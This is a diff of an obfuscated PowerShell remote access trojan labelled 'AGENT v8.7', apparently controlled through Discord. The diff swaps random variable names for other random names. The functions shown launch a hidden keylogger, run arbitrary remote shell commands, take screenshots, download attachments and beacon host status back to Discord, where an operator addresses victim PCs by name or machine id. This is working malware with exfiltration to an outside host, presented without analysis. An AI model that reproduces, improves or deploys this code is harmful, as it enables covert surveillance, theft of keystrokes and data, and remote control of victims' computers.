     } catch {
         return "spawn fail: $_"
     }
@@ -715,33 +682,33 @@ function Stop-CaptureStream {
         }
         if (-not $script:capturePid) { return "not running" }
     }
-    $vtyTjfA = $script:capturePid
+    $hrHI = $script:capturePid
     "stop" | Set-Content -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
     Start-Sleep -Milliseconds 700
-    $ODAUqj = Get-Process -Id $vtyTjfA -EA SilentlyContinue
-    if ($ODAUqj) { try { & taskkill.exe /F /T /PID $vtyTjfA 2>&1 | Out-Null } catch { try { $ODAUqj.Kill() } catch {} } }
+    $IJXS = Get-Process -Id $hrHI -EA SilentlyContinue
+    if ($IJXS) { try { & taskkill.exe /F /T /PID $hrHI 2>&1 | Out-Null } catch { try { $IJXS.Kill() } catch {} } }
     $script:capturePid   = $null
     $script:captureStart = $null
     Remove-Item -LiteralPath $script:capturePidFile -Force -EA SilentlyContinue
     Remove-Item -LiteralPath $script:captureKillFile -Force -EA SilentlyContinue
-    return "stopped PID $vtyTjfA"
+    return "stopped PID $hrHI"
 }
 
 # ==================== KEYLOG ====================
 function Start-KeyLog {
     if ($script:keylogPid) {
-        $ODAUqj = Get-Process -Id $script:keylogPid -EA SilentlyContinue
-        if ($ODAUqj) { return "already running (PID $($script:keylogPid))" }
+        $IJXS = Get-Process -Id $script:keylogPid -EA SilentlyContinue
+        if ($IJXS) { return "already running (PID $($script:keylogPid))" }
         $script:keylogPid = $null
     }
     Remove-Item -LiteralPath $script:keylogKillFile -Force -EA SilentlyContinue
 
-    $McGjS6l7 = Join-Path $env:TEMP "dag_klog_$([guid]::NewGuid().ToString('N')).ps1"
-    [System.IO.File]::WriteAllText($McGjS6l7, $script:KeylogChildCode, $script:utf8NoBom)
+    $EVnnM = Join-Path $env:TEMP "dag_klog_$([guid]::NewGuid().ToString('N')).ps1"
+    [System.IO.File]::WriteAllText($EVnnM, $script:KeylogChildCode, $script:utf8NoBom)
 
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName  = $script:psExe
-    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$McGjS6l7`""
+    $psi.Arguments = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$EVnnM`""
     $psi.UseShellExecute = $false
     $psi.CreateNoWindow  = $true
     $psi.WindowStyle     = "Hidden"
@@ -749,11 +716,11 @@ function Start-KeyLog {
     $psi.EnvironmentVariables["DAG_LOGFILE"]  = $script:keylogLogFile
 
     try {
-        $nHVqb = [System.Diagnostics.Process]::Start($psi)
-        $script:keylogPid   = $nHVqb.Id
+        $fLkjXhj = [System.Diagnostics.Process]::Start($psi)
+        $script:keylogPid   = $fLkjXhj.Id
         $script:keylogStart = Get-Date
-        "$($nHVqb.Id)" | Set-Content -LiteralPath $script:keylogPidFile -Force
-        return "Keylog started | PID $($nHVqb.Id)"
+        "$($fLkjXhj.Id)" | Set-Content -LiteralPath $script:keylogPidFile -Force
+        return "Keylog started | PID $($fLkjXhj.Id)"
     } catch {
         return "spawn fail: $_"
     }
@@ -766,16 +733,16 @@ function Stop-KeyLog {
         }
         if (-not $script:keylogPid) { return "not running" }
     }
-    $vtyTjfA = $script:keylogPid
+    $hrHI = $script:keylogPid
     "stop" | Set-Content -LiteralPath $script:keylogKillFile -Force
     Start-Sleep -Milliseconds 800
-    $ODAUqj = Get-Process -Id $vtyTjfA -EA SilentlyContinue
-    if ($ODAUqj) { try { & taskkill.exe /F /T /PID $vtyTjfA 2>&1 | Out-Null } catch { try { $ODAUqj.Kill() } catch {} } }
+    $IJXS = Get-Process -Id $hrHI -EA SilentlyContinue
+    if ($IJXS) { try { & taskkill.exe /F /T /PID $hrHI 2>&1 | Out-Null } catch { try { $IJXS.Kill() } catch {} } }
     $script:keylogPid   = $null
     $script:keylogStart = $null
     Remove-Item -LiteralPath $script:keylogPidFile -Force -EA SilentlyContinue
     Remove-Item -LiteralPath $script:keylogKillFile -Force -EA SilentlyContinue
-    return "stopped PID $vtyTjfA"
+    return "stopped PID $hrHI"
 }
 
 # ==================== ROUTING ====================
@@ -783,16 +750,16 @@ function Get-MessageTarget {
     param([string]$Content)
     if ($Content -match '^@all\s+([\s\S]*)$')    { return @{ Target='all'; Cmd=$Matches[1] } }
     if ($Content -match '^@(\S+)\s+([\s\S]*)$') {
-        $C8ky9sJ = $Matches[1]
-        if ($C8ky9sJ -eq '*') { return @{ Target='all'; Cmd=$Matches[2] } }
-        if ($C8ky9sJ.ToLower() -eq 'me') { return @{ Target='me'; Cmd=$Matches[2] } }
-        if ($C8ky9sJ.ToLower() -eq $script:pcName.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
-        if ($C8ky9sJ.ToLower() -eq $script:hostname.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
+        $gpNYybm = $Matches[1]
+        if ($gpNYybm -eq '*') { return @{ Target='all'; Cmd=$Matches[2] } }
+        if ($gpNYybm.ToLower() -eq 'me') { return @{ Target='me'; Cmd=$Matches[2] } }
+        if ($gpNYybm.ToLower() -eq $script:pcName.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
+        if ($gpNYybm.ToLower() -eq $script:hostname.ToLower()) { return @{ Target='me'; Cmd=$Matches[2] } }
         return @{ Target='other'; Cmd=$Matches[2] }
     }
     if ($Content -match '^#([0-9a-fA-F]+)\s+([\s\S]*)$') {
-        $FADD18i = $Matches[1].ToLower()
-        if ($FADD18i -eq $script:machineId) { return @{ Target='me'; Cmd=$Matches[2] } }
+        $eNeS = $Matches[1].ToLower()
+        if ($eNeS -eq $script:machineId) { return @{ Target='me'; Cmd=$Matches[2] } }
         return @{ Target='other'; Cmd=$Matches[2] }
     }
     return @{ Target='all'; Cmd=$Content }
@@ -800,23 +767,23 @@ function Get-MessageTarget {
 
 function Test-IsShellTarget {
     if ($script:shellTargets.Count -eq 0) { return $false }
-    $XfeP = $script:pcName.ToLower()
-    $C8ky9sJ = $script:hostname.ToLower()
-    foreach ($JjMCP in $script:shellTargets) {
-        $D6qD = $JjMCP.ToLower()
-        if ($D6qD -eq 'all' -or $D6qD -eq '*' -or $D6qD -eq $XfeP -or $D6qD -eq $C8ky9sJ) { return $true }
+    $DpOtxiEJ = $script:pcName.ToLower()
+    $gpNYybm = $script:hostname.ToLower()
+    foreach ($vAMDhry1 in $script:shellTargets) {
+        $nBifFBfW = $vAMDhry1.ToLower()
+        if ($nBifFBfW -eq 'all' -or $nBifFBfW -eq '*' -or $nBifFBfW -eq $DpOtxiEJ -or $nBifFBfW -eq $gpNYybm) { return $true }
     }
     return $false
 }
 
 function Send-Heartbeat {
     try {
-        $E3MmCtUD = (Get-Date) - $script:startTime
-        $FsP6FU = if (Test-Admin) { "admin" } else { "user" }
-        $n05bGthq = if ($script:isSet) { "" } else { " *(chua setpc)*" }
-        $CnGgkHz9 = if ($script:shellMode) { " shell" } else { "" }
-        $cqSkz = "ON **$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | up $([math]::Floor($E3MmCtUD.TotalHours))h$($E3MmCtUD.Minutes)m | $FsP6FU | cwd ``$($script:workDir)``$n05bGthq$CnGgkHz9"
-        Send-DiscordMessage -Content $cqSkz -NoTag
+        $Mcud2Fwx = (Get-Date) - $script:startTime
+        $bDsym = if (Test-Admin) { "admin" } else { "user" }
+        $XBcPp = if ($script:isSet) { "" } else { " *(chua setpc)*" }
+        $wOiiEno = if ($script:shellMode) { " shell" } else { "" }
+        $Ut6vaf0 = "ON **$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | up $([math]::Floor($Mcud2Fwx.TotalHours))h$($Mcud2Fwx.Minutes)m | $bDsym | cwd ``$($script:workDir)``$XBcPp$wOiiEno"
+        Send-DiscordMessage -Content $Ut6vaf0 -NoTag
         $script:lastBeat = Get-Date
     } catch { }
 }
@@ -825,42 +792,42 @@ function Resolve-ShellLine {
     param([string]$Line, [string]$MsgId)
     $Line = ([string]$Line).Trim()
     if (-not $Line) { return }
-    if ($Line -match '^(\S+)\s*([\s\S]*)$') { $PAbEkp = $Matches[1]; $GQzq = $Matches[2] }
-    else { $PAbEkp = $Line; $GQzq = "" }
-    $cFTcdMtX = $PAbEkp.ToLower()
+    if ($Line -match '^(\S+)\s*([\s\S]*)$') { $e6Ie = $Matches[1]; $T1vK = $Matches[2] }
+    else { $e6Ie = $Line; $T1vK = "" }
+    $PUwcNZ = $e6Ie.ToLower()
 
-    if ($cFTcdMtX -in @("cd","chdir","pushd","popd")) {
-        $tfmq = $GQzq.Trim().Trim('"').Trim("'")
-        if ($cFTcdMtX -eq "popd") { $tfmq = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
-        if ($cFTcdMtX -in @("cd","chdir","pushd") -and -not $tfmq) { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("cd","chdir","pushd","popd")) {
+        $FOnpYT = $T1vK.Trim().Trim('"').Trim("'")
+        if ($PUwcNZ -eq "popd") { $FOnpYT = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
+        if ($PUwcNZ -in @("cd","chdir","pushd") -and -not $FOnpYT) { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
         try {
-            if ($tfmq -eq "..") { $kDrk = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
-            elseif ($tfmq -eq ".") { $kDrk = $script:workDir }
-            elseif ($tfmq -match '^[A-Za-z]:$') { $kDrk = "$tfmq\" }
-            elseif ([System.IO.Path]::IsPathRooted($tfmq)) { $kDrk = [System.IO.Path]::GetFullPath($tfmq) }
-            else { $kDrk = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $tfmq)) }
-            if (Test-Path -LiteralPath $kDrk -PathType Container) { $script:workDir = (Get-Item -LiteralPath $kDrk).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId }
-            else { Send-DiscordMessage -Content "not found: ``$kDrk``" -ReplyToId $MsgId }
+            if ($FOnpYT -eq "..") { $uRBm62L = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
+            elseif ($FOnpYT -eq ".") { $uRBm62L = $script:workDir }
+            elseif ($FOnpYT -match '^[A-Za-z]:$') { $uRBm62L = "$FOnpYT\" }
+            elseif ([System.IO.Path]::IsPathRooted($FOnpYT)) { $uRBm62L = [System.IO.Path]::GetFullPath($FOnpYT) }
+            else { $uRBm62L = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $FOnpYT)) }
+            if (Test-Path -LiteralPath $uRBm62L -PathType Container) { $script:workDir = (Get-Item -LiteralPath $uRBm62L).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId }
+            else { Send-DiscordMessage -Content "not found: ``$uRBm62L``" -ReplyToId $MsgId }
         } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $MsgId }
         return
     }
-    if ($cFTcdMtX -eq "pwd") { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -in @("exit","quit")) { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -in @("cls","clear")) { Send-DiscordMessage -Content "cleared" -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -in @("ls","ll","la")) { $Aa5Lc = if ($cFTcdMtX -eq "la") { "/a" } else { "" }; $FVc0BFE = Invoke-CmdCommand -Command "dir $Aa5Lc $GQzq".Trim(); Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -in @("cat","less","more")) { $FVc0BFE = Invoke-CmdCommand -Command "type $GQzq"; Send-CodeBlock -Title "cat" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -eq "cp") { $FVc0BFE = Invoke-CmdCommand -Command "copy $GQzq"; Send-CodeBlock -Title "cp" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -eq "mv") { $FVc0BFE = Invoke-CmdCommand -Command "move $GQzq"; Send-CodeBlock -Title "mv" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -eq "rm") { $FVc0BFE = Invoke-CmdCommand -Command "del /q $GQzq"; Send-CodeBlock -Title "rm" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -in @("rmdir","rd")) { $FVc0BFE = Invoke-CmdCommand -Command "rmdir /s /q $GQzq"; Send-CodeBlock -Title "rmdir" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -in @("mkdir","md")) { $FVc0BFE = Invoke-CmdCommand -Command "mkdir $GQzq"; Send-CodeBlock -Title "mkdir" -Body $FVc0BFE -ReplyToId $MsgId; return }
-    if ($cFTcdMtX -eq "echo") { if ($GQzq -eq "." -or $GQzq -eq "") { Send-DiscordMessage -Content "(blank)" -ReplyToId $MsgId } else { Send-DiscordMessage -Content $GQzq -ReplyToId $MsgId }; return }
-    if ($cFTcdMtX -eq "help") { Send-DiscordMessage -Content "go !help" -ReplyToId $MsgId; return }
-    $FVc0BFE = Invoke-CmdCommand -Command $Line
-    Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $FVc0BFE -ReplyToId $MsgId
+    if ($PUwcNZ -eq "pwd") { Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("exit","quit")) { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("cls","clear")) { Send-DiscordMessage -Content "cleared" -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("ls","ll","la")) { $PTod2an = if ($PUwcNZ -eq "la") { "/a" } else { "" }; $ML4Hl = Invoke-CmdCommand -Command "dir $PTod2an $T1vK".Trim(); Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("cat","less","more")) { $ML4Hl = Invoke-CmdCommand -Command "type $T1vK"; Send-CodeBlock -Title "cat" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -eq "cp") { $ML4Hl = Invoke-CmdCommand -Command "copy $T1vK"; Send-CodeBlock -Title "cp" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -eq "mv") { $ML4Hl = Invoke-CmdCommand -Command "move $T1vK"; Send-CodeBlock -Title "mv" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -eq "rm") { $ML4Hl = Invoke-CmdCommand -Command "del /q $T1vK"; Send-CodeBlock -Title "rm" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("rmdir","rd")) { $ML4Hl = Invoke-CmdCommand -Command "rmdir /s /q $T1vK"; Send-CodeBlock -Title "rmdir" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -in @("mkdir","md")) { $ML4Hl = Invoke-CmdCommand -Command "mkdir $T1vK"; Send-CodeBlock -Title "mkdir" -Body $ML4Hl -ReplyToId $MsgId; return }
+    if ($PUwcNZ -eq "echo") { if ($T1vK -eq "." -or $T1vK -eq "") { Send-DiscordMessage -Content "(blank)" -ReplyToId $MsgId } else { Send-DiscordMessage -Content $T1vK -ReplyToId $MsgId }; return }
+    if ($PUwcNZ -eq "help") { Send-DiscordMessage -Content "go !help" -ReplyToId $MsgId; return }
+    $ML4Hl = Invoke-CmdCommand -Command $Line
+    Send-CodeBlock -Title "$($script:pcName)> $Line" -Body $ML4Hl -ReplyToId $MsgId
 }
 
-$IBzwDT9 = @'
+$UBfIXKm = @'
 **AGENT v8.7**
 **SHELL:** ``!shellon [PC...]`` ``!shelloff`` ``!shells``
 **ROUTE:** ``@all`` ``@PC1`` ``@me`` ``#<id>``
@@ -884,200 +851,200 @@ function Handle-Command {
     try {
         if ($script:allowedUsers.Count -gt 0 -and $Message.author.id -notin $script:allowedUsers) { return }
 
-        $djla5Q    = [string]$Message.content
-        $F8INmfY = $Message.author.username
+        $xtCfmk    = [string]$Message.content
+        $aUq5fvGH = $Message.author.username
         $msgId  = $Message.id
-        $iI1gWABd = $djla5Q.Trim()
-        $eITC67 = ($Message.attachments -and $Message.attachments.Count -gt 0)
+        $z46dHft = $xtCfmk.Trim()
+        $EFjZVu = ($Message.attachments -and $Message.attachments.Count -gt 0)
 
-        $y9GRg3 = Get-MessageTarget -Content $iI1gWABd
-        if ($y9GRg3.Target -eq 'other') { return }
-        $ZFZ3q = ([string]$y9GRg3.Cmd).Trim()
-        if (-not $ZFZ3q -and -not $eITC67) { return }
-        $gQaFy6BG = ""
-        if ($ZFZ3q -match '^(\S+)') { $gQaFy6BG = $Matches[1].ToLower() }
-        $bdUegpN = $null
-        if ($ZFZ3q -match '^[!/]') { $bdUegpN = ($ZFZ3q -replace '^[!/]', '').Trim() }
-        elseif ($script:shellMode -and (Test-IsShellTarget) -and $ZFZ3q) {
-            if ($gQaFy6BG -in $script:botOnlyCommands) { $bdUegpN = $ZFZ3q }
+        $Z2FMyb = Get-MessageTarget -Content $z46dHft
+        if ($Z2FMyb.Target -eq 'other') { return }
+        $OjCj = ([string]$Z2FMyb.Cmd).Trim()
+        if (-not $OjCj -and -not $EFjZVu) { return }
+        $qNnvR = ""
+        if ($OjCj -match '^(\S+)') { $qNnvR = $Matches[1].ToLower() }
+        $EmBahW = $null
+        if ($OjCj -match '^[!/]') { $EmBahW = ($OjCj -replace '^[!/]', '').Trim() }
+        elseif ($script:shellMode -and (Test-IsShellTarget) -and $OjCj) {
+            if ($qNnvR -in $script:botOnlyCommands) { $EmBahW = $OjCj }
             else {
-                $PKZpT = Get-Date -Format 'HH:mm:ss'
-                [void]$script:history.Add("[$PKZpT] ${F8INmfY}: $ZFZ3q")
+                $JI21cMBF = Get-Date -Format 'HH:mm:ss'
+                [void]$script:history.Add("[$JI21cMBF] ${aUq5fvGH}: $OjCj")
                 while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }
-                Resolve-ShellLine -Line $ZFZ3q -MsgId $msgId
+                Resolve-ShellLine -Line $OjCj -MsgId $msgId
                 return
             }
         } else {
-            if ($ZFZ3q -match '^(hi|hello|chao|hey)$') { Send-DiscordMessage -Content "hi $F8INmfY" -ReplyToId $msgId; return }
-            if ($eITC67 -and $y9GRg3.Target -eq 'me') {
-                $AD04G = Download-DiscordAttachment -Message $Message
-                if ($AD04G.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($AD04G | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
+            if ($OjCj -match '^(hi|hello|chao|hey)$') { Send-DiscordMessage -Content "hi $aUq5fvGH" -ReplyToId $msgId; return }
+            if ($EFjZVu -and $Z2FMyb.Target -eq 'me') {
+                $Xtpbfge = Download-DiscordAttachment -Message $Message
+                if ($Xtpbfge.Count -gt 0) { Send-DiscordMessage -Content "saved: " + (($Xtpbfge | ForEach-Object { "``$_``" }) -join ", ") -ReplyToId $msgId }
             }
             return
         }
-        if (-not $bdUegpN -and -not $eITC67) { return }
-        if ($bdUegpN -match '^(\S+)\s*([\s\S]*)$') { $name = $Matches[1].ToLower(); $BktMd = $Matches[2] }
-        else { $name = $bdUegpN.ToLower(); $BktMd = "" }
-        $PKZpT = Get-Date -Format 'HH:mm:ss'
-        [void]$script:history.Add("[$PKZpT] ${F8INmfY}: $bdUegpN")
+        if (-not $EmBahW -and -not $EFjZVu) { return }
+        if ($EmBahW -match '^(\S+)\s*([\s\S]*)$') { $name = $Matches[1].ToLower(); $tNJR = $Matches[2] }
+        else { $name = $EmBahW.ToLower(); $tNJR = "" }
+        $JI21cMBF = Get-Date -Format 'HH:mm:ss'
+        [void]$script:history.Add("[$JI21cMBF] ${aUq5fvGH}: $EmBahW")
         while ($script:history.Count -gt $script:historyMax) { $script:history.RemoveAt(0) }
 
         switch ($name) {
-            "help"  { Send-DiscordMessage -Content $IBzwDT9 -ReplyToId $msgId; return }
+            "help"  { Send-DiscordMessage -Content $UBfIXKm -ReplyToId $msgId; return }
             "ping"  { Send-DiscordMessage -Content "pong" -ReplyToId $msgId; return }
             "id"    { Send-DiscordMessage -Content "ID: ``$($script:machineId)```nName: ``$($script:pcName)```nHost: ``$($script:hostname)```nInstance: #$($script:instanceId) ($(if($script:isActive){'ACTIVE'}else{'BACKUP'}))`nPID: $($script:myPid)" -ReplyToId $msgId; return }
             "instance" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`nMutex: ``$($script:mutexName)``" -ReplyToId $msgId; return }
             "instances" { Send-DiscordMessage -Content "Instance #$($script:instanceId) | $(if($script:isActive){'ACTIVE'}else{'BACKUP'})" -ReplyToId $msgId; return }
             "getpc" { Send-DiscordMessage -Content "PC: **$($script:pcName)** ``$($script:machineId)```nHost: ``$($script:hostname)```nSet: $(if($script:isSet){'yes'}else{'no'})" -ReplyToId $msgId; return }
             "setpc" {
-                if (-not $BktMd) { Send-DiscordMessage -Content "usage: !setpc <name>" -ReplyToId $msgId; return }
-                $XfeP = ($BktMd.Trim() -split '\s+')[0]
-                $script:pcName = $XfeP; $script:isSet = $true
+                if (-not $tNJR) { Send-DiscordMessage -Content "usage: !setpc <name>" -ReplyToId $msgId; return }
+                $DpOtxiEJ = ($tNJR.Trim() -split '\s+')[0]
+                $script:pcName = $DpOtxiEJ; $script:isSet = $true
                 $script:tag = "[$($script:pcName):$($script:machineId)]"
-                Save-Config @{ name = $XfeP; id = $script:machineId; host = $script:hostname }
-                Send-DiscordMessage -Content "Ten: **$XfeP**" -ReplyToId $msgId; return
+                Save-Config @{ name = $DpOtxiEJ; id = $script:machineId; host = $script:hostname }
+                Send-DiscordMessage -Content "Ten: **$DpOtxiEJ**" -ReplyToId $msgId; return
             }
             "whoami"{ Send-DiscordMessage -Content "``$env:USERDOMAIN\$env:USERNAME`` admin=$(if(Test-Admin){'Y'}else{'N'})" -ReplyToId $msgId; return }
             "bot_info" {
-                $E3MmCtUD = (Get-Date) - $script:startTime
-                $RaOc9j  = "**$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | v8.7`n"
-                $RaOc9j += "up $([math]::Floor($E3MmCtUD.TotalHours))h$($E3MmCtUD.Minutes)m | admin: $(if(Test-Admin){'Y'}else{'N'})`n"
-                $RaOc9j += "Status: **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`n"
-                $RaOc9j += "cwd ``$($script:workDir)``"
-                Send-DiscordMessage -Content $RaOc9j -ReplyToId $msgId; return
+                $Mcud2Fwx = (Get-Date) - $script:startTime
+                $hFUm  = "**$($script:pcName)** ``$($script:machineId)`` #$($script:instanceId) | v8.7`n"
+                $hFUm += "up $([math]::Floor($Mcud2Fwx.TotalHours))h$($Mcud2Fwx.Minutes)m | admin: $(if(Test-Admin){'Y'}else{'N'})`n"
+                $hFUm += "Status: **$(if($script:isActive){'ACTIVE'}else{'BACKUP'})** | PID $($script:myPid)`n"
+                $hFUm += "cwd ``$($script:workDir)``"
+                Send-DiscordMessage -Content $hFUm -ReplyToId $msgId; return
             }
-            "uptime" { $E3MmCtUD=(Get-Date)-$script:startTime; Send-DiscordMessage -Content "up $([math]::Floor($E3MmCtUD.TotalHours))h$($E3MmCtUD.Minutes)m" -ReplyToId $msgId; return }
+            "uptime" { $Mcud2Fwx=(Get-Date)-$script:startTime; Send-DiscordMessage -Content "up $([math]::Floor($Mcud2Fwx.TotalHours))h$($Mcud2Fwx.Minutes)m" -ReplyToId $msgId; return }
             "shutdown" { Send-DiscordMessage -Content "bot off" -ReplyToId $msgId; Start-Sleep 1; $script:running = $false; return }
             "history" { if ($script:history.Count -eq 0) { Send-DiscordMessage -Content "empty" -ReplyToId $msgId; return }; Send-CodeBlock -Title "history" -Body (($script:history | Select-Object -Last 20) -join "`n") -ReplyToId $msgId; return }
             "clearhist" { $script:history.Clear(); Send-DiscordMessage -Content "cleared" -ReplyToId $msgId; return }
             "cwd" { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
             "cd" {
-                if (-not $BktMd) { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
+                if (-not $tNJR) { Send-DiscordMessage -Content "``$($script:workDir)``" -ReplyToId $msgId; return }
                 try {
-                    $JjMCP = $BktMd.Trim().Trim('"')
-                    if ($JjMCP -eq "..") { $XfeP = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
-                    elseif ($JjMCP -match '^[A-Za-z]:$') { $XfeP = "$JjMCP\" }
-                    elseif ([System.IO.Path]::IsPathRooted($JjMCP)) { $XfeP = [System.IO.Path]::GetFullPath($JjMCP) }
-                    else { $XfeP = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $JjMCP)) }
-                    if (Test-Path -LiteralPath $XfeP -PathType Container) { $script:workDir = (Get-Item -LiteralPath $XfeP).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $msgId }
+                    $vAMDhry1 = $tNJR.Trim().Trim('"')
+                    if ($vAMDhry1 -eq "..") { $DpOtxiEJ = (Get-Item -LiteralPath $script:workDir).Parent.FullName }
+                    elseif ($vAMDhry1 -match '^[A-Za-z]:$') { $DpOtxiEJ = "$vAMDhry1\" }
+                    elseif ([System.IO.Path]::IsPathRooted($vAMDhry1)) { $DpOtxiEJ = [System.IO.Path]::GetFullPath($vAMDhry1) }
+                    else { $DpOtxiEJ = [System.IO.Path]::GetFullPath((Join-Path $script:workDir $vAMDhry1)) }
+                    if (Test-Path -LiteralPath $DpOtxiEJ -PathType Container) { $script:workDir = (Get-Item -LiteralPath $DpOtxiEJ).FullName; Send-DiscordMessage -Content "DIR ``$($script:workDir)``" -ReplyToId $msgId }
                     else { Send-DiscordMessage -Content "not found" -ReplyToId $msgId }
                 } catch { Send-DiscordMessage -Content "ERR: $_" -ReplyToId $msgId }
                 return
             }
             "shell" {
-                $bndCZBqZ = $BktMd.Trim().ToLower()
-                if ($bndCZBqZ -eq "on") { $script:shellMode = $true; Send-DiscordMessage -Content "shell ON" -ReplyToId $msgId }
-                elseif ($bndCZBqZ -eq "off") { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $msgId }
+                $Qo7e = $tNJR.Trim().ToLower()
+                if ($Qo7e -eq "on") { $script:shellMode = $true; Send-DiscordMessage -Content "shell ON" -ReplyToId $msgId }
+                elseif ($Qo7e -eq "off") { $script:shellMode = $false; Send-DiscordMessage -Content "shell OFF" -ReplyToId $msgId }
                 else { Send-DiscordMessage -Content "shell: $(if($script:shellMode){'ON'}else{'OFF'})" -ReplyToId $msgId }
                 return
             }
             "shellon" {
                 $script:shellTargets.Clear()
-                if (-not $BktMd) { [void]$script:shellTargets.Add('all') }
-                else { foreach ($JjMCP in ($BktMd.Trim() -split '\s+')) { if ($JjMCP) { [void]$script:shellTargets.Add($JjMCP) } } }
+                if (-not $tNJR) { [void]$script:shellTargets.Add('all') }
+                else { foreach ($vAMDhry1 in ($tNJR.Trim() -split '\s+')) { if ($vAMDhry1) { [void]$script:shellTargets.Add($vAMDhry1) } } }
                 if (Test-IsShellTarget) { $script:shellMode = $true; Send-DiscordMessage -Content "**$($script:pcName)** shell ON | targets: ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }
                 else { $script:shellMode = $false }
                 return
             }
             "shelloff" {
-                $BpAXz = $true
-                if ($BktMd) {
-                    $BpAXz = $false
-                    foreach ($JjMCP in ($BktMd.Trim() -split '\s+')) {
-                        $D6qD = $JjMCP.ToLower()
-                        if ($D6qD -eq 'all' -or $D6qD -eq '*' -or $D6qD -eq $script:pcName.ToLower() -or $D6qD -eq $script:hostname.ToLower()) { $BpAXz = $true; break }
+                $QRUlOOh = $true
+                if ($tNJR) {
+                    $QRUlOOh = $false
+                    foreach ($vAMDhry1 in ($tNJR.Trim() -split '\s+')) {
+                        $nBifFBfW = $vAMDhry1.ToLower()
+                        if ($nBifFBfW -eq 'all' -or $nBifFBfW -eq '*' -or $nBifFBfW -eq $script:pcName.ToLower() -or $nBifFBfW -eq $script:hostname.ToLower()) { $QRUlOOh = $true; break }
                     }
                 }
-                if ($BpAXz) {
+                if ($QRUlOOh) {
                     $script:shellMode = $false; $script:shellTargets.Clear()
                     Send-DiscordMessage -Content "**$($script:pcName)** shell OFF" -ReplyToId $msgId
                 }
                 return
             }
             "shells" { if ($script:shellMode) { Send-DiscordMessage -Content "**$($script:pcName)** in shell | ``$($script:shellTargets -join ', ')``" -ReplyToId $msgId }; return }
-            "silent" { $bndCZBqZ = $BktMd.Trim().ToLower(); if ($bndCZBqZ -eq "off") { $script:silent = $false; Send-DiscordMessage -Content "loud" -ReplyToId $msgId } else { $script:silent = $true; Send-DiscordMessage -Content "silent" -ReplyToId $msgId }; return }
+            "silent" { $Qo7e = $tNJR.Trim().ToLower(); if ($Qo7e -eq "off") { $script:silent = $false; Send-DiscordMessage -Content "loud" -ReplyToId $msgId } else { $script:silent = $true; Send-DiscordMessage -Content "silent" -ReplyToId $msgId }; return }
             "beat" { Send-Heartbeat; Send-DiscordMessage -Content "beat" -ReplyToId $msgId; return }
 
             "screenshot" { $path = Join-Path $env:TEMP "s_$(Get-Date -Format 'HHmmss').png"; if (Take-Screenshot -Path $path) { Send-DiscordFile -FilePath $path -Content "screenshot" -ReplyToId $msgId; Remove-Item $path -Force -EA SilentlyContinue } else { Send-DiscordMessage -Content "screenshot fail" -ReplyToId $msgId }; return }
 
             "capture" {
-                $VvYns = ""
